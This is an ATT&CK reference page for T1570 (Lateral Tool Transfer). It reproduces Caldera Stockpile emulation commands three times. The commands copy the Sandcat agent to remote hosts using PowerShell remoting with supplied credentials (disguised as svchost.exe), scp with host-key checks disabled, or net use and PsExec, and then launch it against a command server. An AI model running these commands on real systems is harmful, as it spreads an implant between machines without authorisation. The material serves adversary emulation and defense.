
# Lateral Tool Transfer

## Description

### MITRE Description

> Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1570

## Potential Commands

```
{'windows': {'psh,pwsh': {'command': '$job = Start-Job -ScriptBlock {\n  $username = "#{domain.user.name}";\n  $password = "#{domain.user.password}";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;\n  $location = "#{location}";\n  $exe = "#{exe_name}";\n  Copy-Item $location.replace($exe, "sandcat.go-windows") -Destination "C:\\Users\\Public\\svchost.exe" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n', 'cleanup': '$job = Start-Job -ScriptBlock {\n  $username = "#{domain.user.name}";\n  $password = "#{domain.user.password}";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item "C:\\Users\\Public\\svchost.exe" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n', 'payloads': ['sandcat.go-windows']}}, 'darwin': {'sh': {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n', 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", 'payloads': ['sandcat.go-darwin']}}, 'linux': {'sh': {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n', 'cleanup': "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", 'payloads': ['sandcat.go-linux']}}}
{'windows': {'cmd': {'cleanup': 'del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe', 'command': 'net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n', 'payloads': ['sandcat.go-windows']}}}
```

## Commands Dataset

```
[{'command': {'darwin': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 '
                                           "#{remote.ssh.cmd} 'rm -f "
                                           "sandcat.go'\n",
                                'command': 'scp -o StrictHostKeyChecking=no -o '
                                           'UserKnownHostsFile=/dev/null -o '
                                           'ConnectTimeout=3 sandcat.go-darwin '
                                           '#{remote.ssh.cmd}:~/sandcat.go\n',
                                'payloads': ['sandcat.go-darwin']}},
              'linux': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 -o '
                                          'StrictHostKeyChecking=no '
                                          "#{remote.ssh.cmd} 'rm -f "
                                          "sandcat.go'\n",
                               'command': 'scp -o StrictHostKeyChecking=no -o '
                                          'UserKnownHostsFile=/dev/null -o '
                                          'ConnectTimeout=3 sandcat.go-linux '
                                          '#{remote.ssh.cmd}:~/sandcat.go\n',
                               'payloads': ['sandcat.go-linux']}},
              'windows': {'psh,pwsh': {'cleanup': '$job = Start-Job '
                                                  '-ScriptBlock {\n'
                                                  '  $username = '
                                                  '"#{domain.user.name}";\n'
                                                  '  $password = '
                                                  '"#{domain.user.password}";\n'
                                                  '  $secstr = New-Object '
                                                  '-TypeName '
                                                  'System.Security.SecureString;\n'
                                                  '  $password.ToCharArray() | '
                                                  'ForEach-Object '
                                                  '{$secstr.AppendChar($_)};\n'
                                                  '  $cred = New-Object '
                                                  '-Typename '
                                                  'System.Management.Automation.PSCredential '
                                                  '-Argumentlist $username, '
                                                  '$secstr;\n'
                                                  '  $session = New-PSSession '
                                                  '-ComputerName '
                                                  '"#{remote.host.name}" '
                                                  '-Credential $cred;\n'
                                                  '  Invoke-Command -Session '
                                                  '$session -Command '
                                                  '{Remove-Item '
                                                  '"C:\\Users\\Public\\svchost.exe" '
                                                  '-force};\n'
                                                  '  Start-Sleep -s 5;\n'
                                                  '  Remove-PSSession -Session '
                                                  '$session;\n'
                                                  '};\n'
                                                  'Receive-Job -Job $job '
                                                  '-Wait;\n',
                                       'command': '$job = Start-Job '
                                                  '-ScriptBlock {\n'
                                                  '  $username = '
                                                  '"#{domain.user.name}";\n'
                                                  '  $password = '
                                                  '"#{domain.user.password}";\n'
                                                  '  $secstr = New-Object '
                                                  '-TypeName '
                                                  'System.Security.SecureString;\n'
                                                  '  $password.ToCharArray() | '
                                                  'ForEach-Object '
                                                  '{$secstr.AppendChar($_)};\n'
                                                  '  $cred = New-Object '
                                                  '-Typename '
                                                  'System.Management.Automation.PSCredential '
                                                  '-Argumentlist $username, '
                                                  '$secstr;\n'
                                                  '  $session = New-PSSession '
                                                  '-ComputerName '
                                                  '"#{remote.host.name}" '
                                                  '-Credential $cred;\n'
                                                  '  $location = '
                                                  '"#{location}";\n'
                                                  '  $exe = "#{exe_name}";\n'
                                                  '  Copy-Item '
                                                  '$location.replace($exe, '
                                                  '"sandcat.go-windows") '
                                                  '-Destination '
                                                  '"C:\\Users\\Public\\svchost.exe" '
                                                  '-ToSession $session;\n'
                                                  '  Start-Sleep -s 5;\n'
                                                  '  Remove-PSSession -Session '
                                                  '$session;\n'
                                                  '};\n'
                                                  'Receive-Job -Job $job '
                                                  '-Wait;\n',
                                       'payloads': ['sandcat.go-windows']}}},
  'name': 'Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP',
  'source': 'data/abilities/lateral-movement/4908fdc4-74fc-4d7c-8935-26d11ad26a8d.yml'},
 {'command': {'windows': {'cmd': {'cleanup': 'del /f sandcat.go-windows && del '
                                             '/f '
                                             '\\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe',
                                  'command': 'net /y use '
                                             '\\\\#{remote.host.name} & copy '
                                             '/y sandcat.go-windows\n'
                                             '\\\\#{remote.host.name}\\Users\\Public '
                                             '& #{psexec.path} -accepteula '
                                             '\\\\#{remote.host.name}\n'
                                             'cmd /c start '
                                             'C:\\Users\\Public\\sandcat.go-windows '
                                             '-server #{server} -v\n',
                                  'payloads': ['sandcat.go-windows']}}},
  'name': 'Copy Sandcat file using PsExec on CMD',
  'source': 'data/abilities/lateral-movement/620b674a-7655-436c-b645-bc3e8ea51abd.yml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre Stockpile - Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP': {'description': 'Copy '
                                                                                                       '54ndc47 '
                                                                                                       'to '
                                                                                                       'remote '
                                                                                                       'host '
                                                                                                       '(powershell '
                                                                                                       '5 '
                                                                                                       'or '
                                                                                                       'newer '
                                                                                                       'only) '
                                                                                                       'or '
                                                                                                       'SCP',
                                                                                        'id': '4908fdc4-74fc-4d7c-8935-26d11ad26a8d',
                                                                                        'name': 'Copy '
                                                                                                '54ndc47 '
                                                                                                '(WinRM '
                                                                                                'and '
                                                                                                'SCP)',
                                                                                        'platforms': {'darwin': {'sh': {'cleanup': 'ssh '
                                                                                                                                   '-o '
                                                                                                                                   'ConnectTimeout=3 '
                                                                                                                                   '#{remote.ssh.cmd} '
                                                                                                                                   "'rm "
                                                                                                                                   '-f '
                                                                                                                                   "sandcat.go'\n",
                                                                                                                        'command': 'scp '
                                                                                                                                   '-o '
                                                                                                                                   'StrictHostKeyChecking=no '
                                                                                                                                   '-o '
                                                                                                                                   'UserKnownHostsFile=/dev/null '
                                                                                                                                   '-o '
                                                                                                                                   'ConnectTimeout=3 '
                                                                                                                                   'sandcat.go-darwin '
                                                                                                                                   '#{remote.ssh.cmd}:~/sandcat.go\n',
                                                                                                                        'payloads': ['sandcat.go-darwin']}},
                                                                                                      'linux': {'sh': {'cleanup': 'ssh '
                                                                                                                                  '-o '
                                                                                                                                  'ConnectTimeout=3 '
                                                                                                                                  '-o '
                                                                                                                                  'StrictHostKeyChecking=no '
                                                                                                                                  '#{remote.ssh.cmd} '
                                                                                                                                  "'rm "
                                                                                                                                  '-f '
                                                                                                                                  "sandcat.go'\n",
                                                                                                                       'command': 'scp '
                                                                                                                                  '-o '
                                                                                                                                  'StrictHostKeyChecking=no '
                                                                                                                                  '-o '
                                                                                                                                  'UserKnownHostsFile=/dev/null '
                                                                                                                                  '-o '
                                                                                                                                  'ConnectTimeout=3 '
                                                                                                                                  'sandcat.go-linux '
                                                                                                                                  '#{remote.ssh.cmd}:~/sandcat.go\n',
                                                                                                                       'payloads': ['sandcat.go-linux']}},
                                                                                                      'windows': {'psh,pwsh': {'cleanup': '$job '
                                                                                                                                          '= '
                                                                                                                                          'Start-Job '
                                                                                                                                          '-ScriptBlock '
                                                                                                                                          '{\n'
                                                                                                                                          '  '
                                                                                                                                          '$username '
                                                                                                                                          '= '
                                                                                                                                          '"#{domain.user.name}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$password '
                                                                                                                                          '= '
                                                                                                                                          '"#{domain.user.password}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$secstr '
                                                                                                                                          '= '
                                                                                                                                          'New-Object '
                                                                                                                                          '-TypeName '
                                                                                                                                          'System.Security.SecureString;\n'
                                                                                                                                          '  '
                                                                                                                                          '$password.ToCharArray() '
                                                                                                                                          '| '
                                                                                                                                          'ForEach-Object '
                                                                                                                                          '{$secstr.AppendChar($_)};\n'
                                                                                                                                          '  '
                                                                                                                                          '$cred '
                                                                                                                                          '= '
                                                                                                                                          'New-Object '
                                                                                                                                          '-Typename '
                                                                                                                                          'System.Management.Automation.PSCredential '
                                                                                                                                          '-Argumentlist '
                                                                                                                                          '$username, '
                                                                                                                                          '$secstr;\n'
                                                                                                                                          '  '
                                                                                                                                          '$session '
                                                                                                                                          '= '
                                                                                                                                          'New-PSSession '
                                                                                                                                          '-ComputerName '
                                                                                                                                          '"#{remote.host.name}" '
                                                                                                                                          '-Credential '
                                                                                                                                          '$cred;\n'
                                                                                                                                          '  '
                                                                                                                                          'Invoke-Command '
                                                                                                                                          '-Session '
                                                                                                                                          '$session '
                                                                                                                                          '-Command '
                                                                                                                                          '{Remove-Item '
                                                                                                                                          '"C:\\Users\\Public\\svchost.exe" '
                                                                                                                                          '-force};\n'
                                                                                                                                          '  '
                                                                                                                                          'Start-Sleep '
                                                                                                                                          '-s '
                                                                                                                                          '5;\n'
                                                                                                                                          '  '
                                                                                                                                          'Remove-PSSession '
                                                                                                                                          '-Session '
                                                                                                                                          '$session;\n'
                                                                                                                                          '};\n'
                                                                                                                                          'Receive-Job '
                                                                                                                                          '-Job '
                                                                                                                                          '$job '
                                                                                                                                          '-Wait;\n',
                                                                                                                               'command': '$job '
                                                                                                                                          '= '
                                                                                                                                          'Start-Job '
                                                                                                                                          '-ScriptBlock '
                                                                                                                                          '{\n'
                                                                                                                                          '  '
                                                                                                                                          '$username '
                                                                                                                                          '= '
                                                                                                                                          '"#{domain.user.name}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$password '
                                                                                                                                          '= '
                                                                                                                                          '"#{domain.user.password}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$secstr '
                                                                                                                                          '= '
                                                                                                                                          'New-Object '
                                                                                                                                          '-TypeName '
                                                                                                                                          'System.Security.SecureString;\n'
                                                                                                                                          '  '
                                                                                                                                          '$password.ToCharArray() '
                                                                                                                                          '| '
                                                                                                                                          'ForEach-Object '
                                                                                                                                          '{$secstr.AppendChar($_)};\n'
                                                                                                                                          '  '
                                                                                                                                          '$cred '
                                                                                                                                          '= '
                                                                                                                                          'New-Object '
                                                                                                                                          '-Typename '
                                                                                                                                          'System.Management.Automation.PSCredential '
                                                                                                                                          '-Argumentlist '
                                                                                                                                          '$username, '
                                                                                                                                          '$secstr;\n'
                                                                                                                                          '  '
                                                                                                                                          '$session '
                                                                                                                                          '= '
                                                                                                                                          'New-PSSession '
                                                                                                                                          '-ComputerName '
                                                                                                                                          '"#{remote.host.name}" '
                                                                                                                                          '-Credential '
                                                                                                                                          '$cred;\n'
                                                                                                                                          '  '
                                                                                                                                          '$location '
                                                                                                                                          '= '
                                                                                                                                          '"#{location}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$exe '
                                                                                                                                          '= '
                                                                                                                                          '"#{exe_name}";\n'
                                                                                                                                          '  '
                                                                                                                                          'Copy-Item '
                                                                                                                                          '$location.replace($exe, '
                                                                                                                                          '"sandcat.go-windows") '
                                                                                                                                          '-Destination '
                                                                                                                                          '"C:\\Users\\Public\\svchost.exe" '
                                                                                                                                          '-ToSession '
                                                                                                                                          '$session;\n'
                                                                                                                                          '  '
                                                                                                                                          'Start-Sleep '
                                                                                                                                          '-s '
                                                                                                                                          '5;\n'
                                                                                                                                          '  '
                                                                                                                                          'Remove-PSSession '
                                                                                                                                          '-Session '
                                                                                                                                          '$session;\n'
                                                                                                                                          '};\n'
                                                                                                                                          'Receive-Job '
                                                                                                                                          '-Job '
                                                                                                                                          '$job '
                                                                                                                                          '-Wait;\n',
                                                                                                                               'payloads': ['sandcat.go-windows']}}},
                                                                                        'tactic': 'lateral-movement',
                                                                                        'technique': {'attack_id': 'T1570',
                                                                                                      'name': 'Lateral '
                                                                                                              'Tool '
                                                                                                              'Transfer'}}},
 {'Mitre Stockpile - Copy Sandcat file using PsExec on CMD': {'description': 'Copy '
                                                                             'Sandcat '
                                                                             'file '
                                                                             'using '
                                                                             'PsExec '
                                                                             'on '
                                                                             'CMD',
                                                              'id': '620b674a-7655-436c-b645-bc3e8ea51abd',
                                                              'name': 'Copy '
                                                                      'Sandcat '
                                                                      'File '
                                                                      'using '
                                                                      'PsExec '
                                                                      'on CMD',
                                                              'platforms': {'windows': {'cmd': {'cleanup': 'del '
                                                                                                           '/f '
                                                                                                           'sandcat.go-windows '
                                                                                                           '&& '
                                                                                                           'del '
                                                                                                           '/f '
                                                                                                           '\\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe',
                                                                                                'command': 'net '
                                                                                                           '/y '
                                                                                                           'use '
                                                                                                           '\\\\#{remote.host.name} '
                                                                                                           '& '
                                                                                                           'copy '
                                                                                                           '/y '
                                                                                                           'sandcat.go-windows\n'
                                                                                                           '\\\\#{remote.host.name}\\Users\\Public '
                                                                                                           '& '
                                                                                                           '#{psexec.path} '
                                                                                                           '-accepteula '
                                                                                                           '\\\\#{remote.host.name}\n'
                                                                                                           'cmd '
                                                                                                           '/c '
                                                                                                           'start '
                                                                                                           'C:\\Users\\Public\\sandcat.go-windows '
                                                                                                           '-server '
                                                                                                           '#{server} '
                                                                                                           '-v\n',
                                                                                                'payloads': ['sandcat.go-windows']}}},
                                                              'tactic': 'lateral-movement',
                                                              'technique': {'attack_id': 'T1570',
                                                                            'name': 'Lateral '
                                                                                    'Tool '
                                                                                    'Transfer'}}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations


* [Network Intrusion Prevention](../mitigations/Network-Intrusion-Prevention.md)

* [Filter Network Traffic](../mitigations/Filter-Network-Traffic.md)
    

# Actors


* [FIN10](../actors/FIN10.md)

* [Turla](../actors/Turla.md)
    
* [Wizard Spider](../actors/Wizard-Spider.md)
    
* [APT32](../actors/APT32.md)
    
